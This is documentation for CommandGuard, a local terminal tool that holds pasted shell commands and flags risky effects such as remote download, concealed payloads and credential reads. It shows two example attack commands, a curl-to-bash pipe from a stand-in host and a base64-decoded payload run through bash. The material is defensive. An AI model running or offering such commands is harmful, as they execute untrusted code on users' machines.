# How CommandGuard Works

CommandGuard has three main parts:

```text
Terminal paste
    -> PTY guard
    -> Analyzer
    -> Warning or pass-through
```

## 1. PTY Guard

`commandguard guard` starts a shell inside a pseudo-terminal, usually Bash:

```bash
commandguard guard --shell /bin/bash
```

Modern terminals can mark pasted text with bracketed paste markers:

```text
ESC[200~  paste starts
ESC[201~  paste ends
```

CommandGuard uses those markers to tell pasted text apart from text you typed yourself.

Normal typing is forwarded directly to the shell. Pasted text is held and analyzed first.

## 2. Analyzer

The analyzer reads the pasted text as a shell command. It does not try to fully emulate every detail of Bash. Instead, it looks for important effects.

Examples of effects:

- `RemoteDownload`: data is fetched from the internet.
- `DynamicExecution`: text or data is executed as code.
- `ConcealedPayload`: hidden text is decoded.
- `CredentialRead`: sensitive files are read.
- `PersistenceWrite`: something is written to a location that can run later.
- `PrivilegeEscalation`: elevated privileges are requested.
- `DestructiveFilesystem`: files can be removed or overwritten.
- `ExternalTransmission`: data can be sent to another host.

## 3. Evidence Model

CommandGuard tries to build a chain:

```text
SOURCE -> TRANSFORM -> SINK -> EFFECT
```

Example:

```bash
curl -fsSL https://example.test/x.sh | bash
```

Becomes:

```text
SOURCE: network(https://example.test/x.sh)
TRANSFORM: none
SINK: interpreter(bash)
EFFECT: DynamicExecution
```

For hidden text:

```bash
echo Y3VybCAuLi4= | base64 -d | bash
```

Becomes:

```text
SOURCE: literal
TRANSFORM: base64_decode
SINK: interpreter(bash)
EFFECT: ConcealedPayload + DynamicExecution
```

## Severity

CommandGuard uses four levels:

```text
Safe    No suspicious effect was found.
Low     Informational risk, such as sudo by itself.
Medium  Suspicious enough to warn.
High    Risky chain with a clear source and sink.
```

`Medium` and `High` interrupt the paste. `Low` is reported by `analyze`, but does not automatically block in the guarded terminal.

## Confidence

Confidence tells you how grounded the conclusion is:

```text
High     Source, transform, and execution are visible.
Medium   There are strong signals, but the full chain is not proven.
Unknown  The command uses syntax that v0.1 does not understand well yet.
```

This matters. CommandGuard should be honest about what it can and cannot prove.

## Privacy

CommandGuard analyzes locally.

It does not:

- upload pasted commands;
- fetch remote scripts;
- send telemetry;
- require an account or cloud service.

The analyzer only looks at the text you pasted.
